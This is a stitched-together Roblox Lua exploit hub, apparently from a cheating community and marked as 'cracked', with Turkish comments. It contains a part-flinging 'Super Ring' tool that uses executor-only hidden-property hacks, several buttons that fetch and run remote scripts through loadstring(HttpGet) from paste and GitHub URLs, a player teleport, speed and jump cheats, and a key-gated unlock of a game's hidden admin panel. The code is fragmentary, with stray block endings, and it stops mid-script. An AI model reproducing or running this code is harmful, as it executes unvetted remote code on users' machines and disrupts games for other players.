+-- Play initial sound
+playSound("2865227271")
+
+-- GUI Creation
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SuperRingPartsGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 220, 0, 190)
+MainFrame.Position = UDim2.new(0.5, -110, 0.5, -95)
+MainFrame.BackgroundColor3 = Color3.fromRGB(205, 170, 125) -- Light brown
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+-- Make the GUI round
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Super Ring Parts v3"
+Title.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+Title.BackgroundColor3 = Color3.fromRGB(222, 184, 135) -- Lighter brown
+Title.Font = Enum.Font.Fondamento -- More elegant font
+Title.TextSize = 22
+Title.Parent = MainFrame
+
+-- Round the title
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 20)
+TitleCorner.Parent = Title
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(0.8, 0, 0, 35)
+ToggleButton.Position = UDim2.new(0.1, 0, 0.3, 0)
+ToggleButton.Text = "Ring Parts Off"
+ToggleButton.BackgroundColor3 = Color3.fromRGB(160, 82, 45) -- Sienna
+ToggleButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+ToggleButton.Font = Enum.Font.Fondamento
+ToggleButton.TextSize = 18
+ToggleButton.Parent = MainFrame
+
+-- Round the toggle button
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 10)
+ToggleCorner.Parent = ToggleButton
+
+local DecreaseRadius = Instance.new("TextButton")
+DecreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
+DecreaseRadius.Position = UDim2.new(0.1, 0, 0.6, 0)
+DecreaseRadius.Text = "<"
+DecreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+DecreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+DecreaseRadius.Font = Enum.Font.Fondamento
+DecreaseRadius.TextSize = 18
+DecreaseRadius.Parent = MainFrame
+
+-- Round the decrease button
+local DecreaseCorner = Instance.new("UICorner")
+DecreaseCorner.CornerRadius = UDim.new(0, 10)
+DecreaseCorner.Parent = DecreaseRadius
+
+local IncreaseRadius = Instance.new("TextButton")
+IncreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
+IncreaseRadius.Position = UDim2.new(0.7, 0, 0.6, 0)
+IncreaseRadius.Text = ">"
+IncreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+IncreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+IncreaseRadius.Font = Enum.Font.Fondamento
+IncreaseRadius.TextSize = 18
+IncreaseRadius.Parent = MainFrame
+
+-- Round the increase button
+local IncreaseCorner = Instance.new("UICorner")
+IncreaseCorner.CornerRadius = UDim.new(0, 10)
+IncreaseCorner.Parent = IncreaseRadius
+
+local RadiusDisplay = Instance.new("TextLabel")
+RadiusDisplay.Size = UDim2.new(0.4, 0, 0, 35)
+RadiusDisplay.Position = UDim2.new(0.3, 0, 0.6, 0)
+RadiusDisplay.Text = "Radius: 50"
+RadiusDisplay.BackgroundColor3 = Color3.fromRGB(210, 180, 140) -- Tan
+RadiusDisplay.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+RadiusDisplay.Font = Enum.Font.Fondamento
+RadiusDisplay.TextSize = 18
+RadiusDisplay.Parent = MainFrame
+
+-- Round the radius display
+local RadiusCorner = Instance.new("UICorner")
+RadiusCorner.CornerRadius = UDim.new(0, 10)
+RadiusCorner.Parent = RadiusDisplay
+
+local Watermark = Instance.new("TextLabel")
+Watermark.Size = UDim2.new(1, 0, 0, 20)
+Watermark.Position = UDim2.new(0, 0, 1, -20)
+Watermark.Text = "Super Ring [V3] - Cracked By bok31_31mal"
+Watermark.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+Watermark.BackgroundTransparency = 1
+Watermark.Font = Enum.Font.Fondamento
+Watermark.TextSize = 14
+Watermark.Parent = MainFrame
+
+-- Add minimize button
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(1, -35, 0, 5)
+MinimizeButton.Text = "-"
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+MinimizeButton.Font = Enum.Font.Fondamento
+MinimizeButton.TextSize = 18
+MinimizeButton.Parent = MainFrame
+
+-- Round the minimize button
+local MinimizeCorner = Instance.new("UICorner")
+MinimizeCorner.CornerRadius = UDim.new(0, 15)
+MinimizeCorner.Parent = MinimizeButton
+
+-- Minimize functionality
+local minimized = false
+MinimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        MainFrame:TweenSize(UDim2.new(0, 220, 0, 40), "Out", "Quad", 0.3, true)
+        MinimizeButton.Text = "+"
+        ToggleButton.Visible = false
+        DecreaseRadius.Visible = false
+        IncreaseRadius.Visible = false
+        RadiusDisplay.Visible = false
+        Watermark.Visible = false
+    else
+        MainFrame:TweenSize(UDim2.new(0, 220, 0, 190), "Out", "Quad", 0.3, true)
+        MinimizeButton.Text = "-"
+        ToggleButton.Visible = true
+        DecreaseRadius.Visible = true
+        IncreaseRadius.Visible = true
+        RadiusDisplay.Visible = true
+        Watermark.Visible = true
+    end
+    playSound("12221967")
+end)
+
+-- Make GUI draggable
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Ring Parts Logic
+if not getgenv().Network then
+    getgenv().Network = {
+        BaseParts = {},
+        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
+    }
+    Network.RetainPart = function(Part)
+        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace) then
+            table.insert(Network.BaseParts, Part)
+            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+            Part.CanCollide = false
+        end
+    end
+    local function EnablePartControl()
+        LocalPlayer.ReplicationFocus = workspace
+        RunService.Heartbeat:Connect(function()
+            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+            for _, Part in pairs(Network.BaseParts) do
+                if Part:IsDescendantOf(workspace) then
+                    Part.Velocity = Network.Velocity
+                end
+            end
+        end)
+    end
+    EnablePartControl()
+end
+
+local radius = 50
+local height = 100
+local rotationSpeed = 10
+local attractionStrength = 1000
+local ringPartsEnabled = false
+
+local function RetainPart(Part)
+    if Part:IsA("BasePart") and not Part.Anchored and Part:IsDescendantOf(workspace) then
+        if Part.Parent == LocalPlayer.Character or Part:IsDescendantOf(LocalPlayer.Character) then
+            return false
+        end
+
+        Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+        Part.CanCollide = false
+        return true
+    end
+    return false
+end
+
+local parts = {}
+local function addPart(part)
+    if RetainPart(part) then
+        if not table.find(parts, part) then
+            table.insert(parts, part)
+        end
+    end
+end
+
+local function removePart(part)
+    local index = table.find(parts, part)
+    if index then
+        table.remove(parts, index)
+    end
+end
+
+for _, part in pairs(workspace:GetDescendants()) do
+    addPart(part)
+end
+
+workspace.DescendantAdded:Connect(addPart)
+workspace.DescendantRemoving:Connect(removePart)
+
+RunService.Heartbeat:Connect(function()
+    if not ringPartsEnabled then return end
+    
+    local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if humanoidRootPart then
+        local tornadoCenter = humanoidRootPart.Position
+        for _, part in pairs(parts) do
+            if part.Parent and not part.Anchored then
+                local pos = part.Position
+                local distance = (Vector3.new(pos.X, tornadoCenter.Y, pos.Z) - tornadoCenter).Magnitude
+                local angle = math.atan2(pos.Z - tornadoCenter.Z, pos.X - tornadoCenter.X)
+                local newAngle = angle + math.rad(rotationSpeed)
+                local targetPos = Vector3.new(
+                    tornadoCenter.X + math.cos(newAngle) * math.min(radius, distance),
+                    tornadoCenter.Y + (height * (math.abs(math.sin((pos.Y - tornadoCenter.Y) / height)))),
+                    tornadoCenter.Z + math.sin(newAngle) * math.min(radius, distance)
+                )
+                local directionToTarget = (targetPos - part.Position).unit
+                part.Velocity = directionToTarget * attractionStrength
+            end
+        end
+    end
+end)
+
+-- Button functionality
+ToggleButton.MouseButton1Click:Connect(function()
+    ringPartsEnabled = not ringPartsEnabled
+    ToggleButton.Text = ringPartsEnabled and "Ring Parts On" or "Ring Parts Off"
+    ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(160, 82, 45)
+    playSound("12221967")
+end)
+
+DecreaseRadius.MouseButton1Click:Connect(function()
+    radius = math.max(10, radius - 5)
+    RadiusDisplay.Text = "Radius: " .. radius
+    playSound("12221967")
+end)
+
+IncreaseRadius.MouseButton1Click:Connect(function()
+    radius = math.min(100, radius + 5)
+    RadiusDisplay.Text = "Radius: " .. radius
+    playSound("12221967")
+end)
+
+
+-- Get player thumbnail
+local userId = Players:GetUserIdFromNameAsync("bok31_31mal")
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Enjoy Super Ring V3",
+    Text = "Cracked By bok31_31mal",
+    Icon = content,
+    Duration = 5
+})
+
+-- Chat message (Updated for new chat system)
+local function SendChatMessage(message)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local textChannel = TextChatService.TextChannels.RBXGeneral
+        textChannel:SendAsync(message)
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    end
+end
+end)
+
+
+MainSection:NewButton("Tbao Hub", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://scriptblox.com/raw/Natural-Disaster-Survival-Tbao-Hub-14356"))()
+end)
+
+local TeleportTab = Window:NewTab("Teleport")
+local TeleportSection = TeleportTab:NewSection("Teleport to Player")
+
+-- Oyuncu listesi oluÃ…Å¸turma
+local players = game.Players:GetPlayers()
+for i, player in ipairs(players) do
+    -- Her oyuncu iÃƒÂ§in teleport dÃƒÂ¼Ã„Å¸mesi oluÃ…Å¸turma
+    TeleportSection:NewButton(player.Name, "Teleport to " .. player.Name, function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+    end)
+end
+
+local MainSection = Main:NewSection("Doors Scripts")
+
+MainSection:NewButton("Doors Script 1", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://rawscripts.net/raw/DOORS-FFJ-Hub-11365'))()
+end)
+
+local MainSection = Main:NewSection("MM2 Scripts")
+
+MainSection:NewButton("Ghost Hub", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Murder%20Mystery"))()
+end)
+
+local MainSection = Main:NewSection("Brookhaven RP Scripts")
+
+MainSection:NewButton("Sander X", "ButtonInfo", function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/Sanderxv3.30/main/sanderx3.30')))()
+
+end)
+
+MainSection:NewButton("The Darkones Gui", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui'))()
+end)
+
+local MainSection = Main:NewSection("Blade Ball Scripts")
+
+MainSection:NewButton("Blade Ball Script", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://pastefy.app/G46MmBn7/raw"))()
+end)
+
+local Player = Window:NewTab("Speed And Jump Power")
+local PlayerSection = Player:NewSection("Speed And Jump Power")
+
+PlayerSection:NewSlider("WalkSpeed", "Adjust your walk speed", 500, 16, function(value)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
+end)
+
+-- Oyuncu zÃ„Â±plama gÃƒÂ¼cÃƒÂ¼ ayarlayan kaydÃ„Â±rÃ„Â±cÃ„Â±
+PlayerSection:NewSlider("JumpPower", "Adjust your jump power", 250, 50, function(value)
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
+end)
+
+-- UyarÃ„Â± veren dÃƒÂ¼Ã„Å¸me eklemek
+PlayerSection:NewButton("Reset Settings", "Reset all settings to default", function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+    print("Settings reset to default.")
+end)
+
+
+local MainSection = Main:NewSection("Who Is The Spy? (KEYLESS)")
+
+MainSection:NewButton("Script1", "ButtonInfo", function()
+    -- Roblox Script: Key Check GUI
+
+-- Check if GUI is already active
+if game.Players.LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("KeyCheckGui") then
+    game.Players.LocalPlayer.PlayerGui:FindFirstChild("KeyCheckGui"):Destroy()
+end
+
+-- Define the required key
+local REQUIRED_KEY = "arasvebaris"
+
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KeyCheckGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame for the GUI
+local guiFrame = Instance.new("Frame")
+guiFrame.Size = UDim2.new(0, 300, 0, 180)
+guiFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
+guiFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+guiFrame.BorderSizePixel = 0
+guiFrame.Active = true
+guiFrame.Draggable = true
+guiFrame.Parent = screenGui
+
+-- Create a Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 30)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Key Check"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextSize = 20
+titleLabel.Parent = guiFrame
+
+-- Create Close (X) Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.Text = "X"
+closeButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 18
+closeButton.Parent = guiFrame
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Create Minimize (-) Button
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+minimizeButton.Position = UDim2.new(1, -70, 0, 5)
+minimizeButton.Text = "-"
+minimizeButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
+minimizeButton.TextColor3 = Color3.new(1, 1, 1)
+minimizeButton.Font = Enum.Font.SourceSansBold
+minimizeButton.TextSize = 18
+minimizeButton.Parent = guiFrame
+
+local isMinimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    guiFrame.Size = isMinimized and UDim2.new(0, 300, 0, 30) or UDim2.new(0, 300, 0, 180)
+    for _, child in ipairs(guiFrame:GetChildren()) do
+        if child ~= titleLabel and child ~= closeButton and child ~= minimizeButton then
+            child.Visible = not isMinimized
+        end
+    end
+end)
+
+-- Create TextBox for Key Input
+local keyInput = Instance.new("TextBox")
+keyInput.Size = UDim2.new(0, 260, 0, 30)
+keyInput.Position = UDim2.new(0, 20, 0, 50)
+keyInput.PlaceholderText = "Enter your key"
+keyInput.Text = ""
+keyInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+keyInput.TextColor3 = Color3.new(1, 1, 1)
+keyInput.Font = Enum.Font.SourceSansBold
+keyInput.TextSize = 18
+keyInput.Parent = guiFrame
+
+-- Create Check Key Button
+local checkKeyButton = Instance.new("TextButton")
+checkKeyButton.Size = UDim2.new(0, 260, 0, 30)
+checkKeyButton.Position = UDim2.new(0, 20, 0, 90)
+checkKeyButton.Text = "Check Key"
+checkKeyButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
+checkKeyButton.TextColor3 = Color3.new(1, 1, 1)
+checkKeyButton.Font = Enum.Font.SourceSansBold
+checkKeyButton.TextSize = 18
+checkKeyButton.Parent = guiFrame
+
+checkKeyButton.MouseButton1Click:Connect(function()
+    local inputText = keyInput.Text
+    if inputText == REQUIRED_KEY then
+        guiFrame:Destroy()
+
+        -- Create the new GUI
+        local newGuiFrame = Instance.new("Frame")
+        newGuiFrame.Size = UDim2.new(0, 300, 0, 200)
+        newGuiFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+        newGuiFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+        newGuiFrame.BorderSizePixel = 0
+        newGuiFrame.Active = true
+        newGuiFrame.Draggable = true
+        newGuiFrame.Parent = screenGui
+
+        local newTitleLabel = Instance.new("TextLabel")
+        newTitleLabel.Size = UDim2.new(1, 0, 0, 30)
+        newTitleLabel.Position = UDim2.new(0, 0, 0, 0)
+        newTitleLabel.BackgroundTransparency = 1
+        newTitleLabel.Text = "Admin Control"
+        newTitleLabel.TextColor3 = Color3.new(1, 1, 1)
+        newTitleLabel.Font = Enum.Font.SourceSansBold
+        newTitleLabel.TextSize = 20
+        newTitleLabel.Parent = newGuiFrame
+
+        local adminCloseButton = Instance.new("TextButton")
+        adminCloseButton.Size = UDim2.new(0, 30, 0, 30)
+        adminCloseButton.Position = UDim2.new(1, -35, 0, 5)
+        adminCloseButton.Text = "X"
+        adminCloseButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+        adminCloseButton.TextColor3 = Color3.new(1, 1, 1)
+        adminCloseButton.Font = Enum.Font.SourceSansBold
+        adminCloseButton.TextSize = 18
+        adminCloseButton.Parent = newGuiFrame
+        adminCloseButton.MouseButton1Click:Connect(function()
+            screenGui:Destroy()
+        end)
+
+        local adminMinimizeButton = Instance.new("TextButton")
+        adminMinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+        adminMinimizeButton.Position = UDim2.new(1, -70, 0, 5)
+        adminMinimizeButton.Text = "-"
+        adminMinimizeButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
+        adminMinimizeButton.TextColor3 = Color3.new(1, 1, 1)
+        adminMinimizeButton.Font = Enum.Font.SourceSansBold
+        adminMinimizeButton.TextSize = 18
+        adminMinimizeButton.Parent = newGuiFrame
+
+        local isAdminMinimized = false
+        adminMinimizeButton.MouseButton1Click:Connect(function()
+            isAdminMinimized = not isAdminMinimized
+            newGuiFrame.Size = isAdminMinimized and UDim2.new(0, 300, 0, 30) or UDim2.new(0, 300, 0, 200)
+            for _, child in ipairs(newGuiFrame:GetChildren()) do
+                if child ~= newTitleLabel and child ~= adminCloseButton and child ~= adminMinimizeButton then
+                    child.Visible = not isAdminMinimized
+                end
+            end
+        end)
+
+        local onButton = Instance.new("TextButton")
+        onButton.Size = UDim2.new(0, 100, 0, 40)
+        onButton.Position = UDim2.new(0, 20, 0, 50)
+        onButton.Text = "On"
+        onButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
+        onButton.TextColor3 = Color3.new(1, 1, 1)
+        onButton.Font = Enum.Font.SourceSansBold
+        onButton.TextSize = 18
+        onButton.Parent = newGuiFrame
+        onButton.MouseButton1Click:Connect(function()
+            game.Players.LocalPlayer.PlayerGui.Interface.Main.adminFrame.Active = true
+            game.Players.LocalPlayer.PlayerGui.Interface.Main.adminFrame.Visible = true
+        end)
+
+        local offButton = Instance.new("TextButton")
+        offButton.Size = UDim2.new(0, 100, 0, 40)
+        offButton.Position = UDim2.new(0, 130, 0, 50)
+        offButton.Text = "Off"
+        offButton.BackgroundColor3 = Color3.new(0.6, 0.2, 0.2)
+        offButton.TextColor3 = Color3.new(1, 1, 1)
+        offButton.Font = Enum.Font.SourceSansBold
+        offButton.TextSize = 18
+        offButton.Parent = newGuiFrame
+        offButton.MouseButton1Click:Connect(function()
+            game.Players.LocalPlayer.PlayerGui.Interface.Main.adminFrame.Active = false
+            game.Players.LocalPlayer.PlayerGui.Interface.Main.adminFrame.Visible = false
+        end)
+    else
+        game.Players.LocalPlayer:Kick("Yanlis Anahtar")
+    end
+end)
+
+-- Create Get Key Button
+local getKeyButton = Instance.new("TextButton")
+getKeyButton.Size = UDim2.new(0, 260, 0, 30)
+getKeyButton.Position = UDim2.new(0, 20, 0, 130)
+getKeyButton.Text = "Get Key"
+getKeyButton.BackgroundColor3 = Color3.new(0.6, 0.6, 0.2)
+getKeyButton.TextColor3 = Color3.new(1, 1, 1)
+getKeyButton.Font = Enum.Font.SourceSansBold
+getKeyButton.TextSize = 18
+getKeyButton.Parent = guiFrame
+
+getKeyButton.MouseButton1Click:Connect(function()
+    setclipboard("https://lootdest.org/s?36a1cbe0")
+    game.StarterGui:SetCore("ChatMakeSystemMessage", {
+        Text = "Copied Link To Clipboard",
+        Color = Color3.new(0, 1, 0),
+        Font = Enum.Font.SourceSansBold,
+        FontSize = Enum.FontSize.Size24
+    })
+end)
+
+end)
+
+
+local MainSection = Main:NewSection("Build A Boat")
+
+MainSection:NewButton("Weshky Auto Build", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/suntisalts/BetaTesting/refs/heads/main/WeshkyAutoBuild.lua'))()
+end)
+
+local Main = Window:NewTab("Others")
+local MainSection = Main:NewSection("Others")
+
+
+MainSection:NewButton("Leave", "ButtonInfo", function()
+-- Oyuncu oyuna girdiğinde GUI ile "Are you sure?" sorusunu sorar
+
+local player = game.Players.LocalPlayer
+
+-- GUI oluştur
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ConfirmLeaveGui"
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 150)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0.4, 0)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Are you sure?"
+Title.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 24
+Title.Parent = Frame
+
+local YesButton = Instance.new("TextButton")
+YesButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+YesButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+YesButton.Text = "Yes"
+YesButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+YesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+YesButton.Font = Enum.Font.SourceSansBold
+YesButton.TextSize = 18
+YesButton.Parent = Frame
+
+local NoButton = Instance.new("TextButton")
+NoButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+NoButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+NoButton.Text = "No"
+NoButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+NoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+NoButton.Font = Enum.Font.SourceSansBold
+NoButton.TextSize = 18
+NoButton.Parent = Frame
+
+-- Yes butonuna tıklandığında oyuncuyu oyundan atar
+YesButton.MouseButton1Click:Connect(function()
+    player:Kick("You Leaved")
+end)
+
+-- No butonuna tıklandığında GUI kapanır
+NoButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+end)
+
+MainSection:NewButton("Rejoin", "ButtonInfo", function()
+-- Oyuncu oyuna girdiğinde GUI ile "Are you sure?" sorusunu sorar
+
+local player = game.Players.LocalPlayer
+
+-- GUI oluştur
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ConfirmRejoinGui"
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 150)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0.4, 0)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Are you sure?"
+Title.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 24
+Title.Parent = Frame
+
+local YesButton = Instance.new("TextButton")
+YesButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+YesButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+YesButton.Text = "Yes"
+YesButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+YesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+YesButton.Font = Enum.Font.SourceSansBold
+YesButton.TextSize = 18
+YesButton.Parent = Frame
+
+local NoButton = Instance.new("TextButton")
+NoButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+NoButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+NoButton.Text = "No"
+NoButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+NoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+NoButton.Font = Enum.Font.SourceSansBold
+NoButton.TextSize = 18
+NoButton.Parent = Frame
+
+-- Yes butonuna tıklandığında aynı servere rejoin
+YesButton.MouseButton1Click:Connect(function()
+    local teleportService = game:GetService("TeleportService")
+    teleportService:TeleportToPlaceInstance(
+        game.PlaceId,
+        game.JobId,
+        player
+    )
+end)
+
+-- No butonuna tıklandığında GUI kapanır
+NoButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+end)
+MainSection:NewButton("Earthquake!(FE)!", "ButtonInfo", function()
+-- Earthquake GUI Script
+
+-- Parent this script to StarterGui in Roblox Studio
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "EarthquakeGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+-- Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 30)
+titleLabel.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+titleLabel.Text = "Earthquake Controller"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextSize = 20
+titleLabel.Parent = frame
+
+-- Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.Text = "X"
+closeButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 18
+closeButton.Parent = frame
+
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Magnitude Input Box
+local magnitudeInput = Instance.new("TextBox")
+magnitudeInput.Size = UDim2.new(0, 260, 0, 30)
+magnitudeInput.Position = UDim2.new(0, 20, 0, 40)
+magnitudeInput.PlaceholderText = "Enter Magnitude"
+magnitudeInput.Text = ""
+magnitudeInput.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+magnitudeInput.TextColor3 = Color3.new(1, 1, 1)
+magnitudeInput.Font = Enum.Font.SourceSansBold
+magnitudeInput.TextSize = 18
+magnitudeInput.Parent = frame
+
+-- Start Button
+local startButton = Instance.new("TextButton")
+startButton.Size = UDim2.new(0, 120, 0, 40)
+startButton.Position = UDim2.new(0, 20, 0, 90)
+startButton.Text = "Start"
+startButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
+startButton.TextColor3 = Color3.new(1, 1, 1)
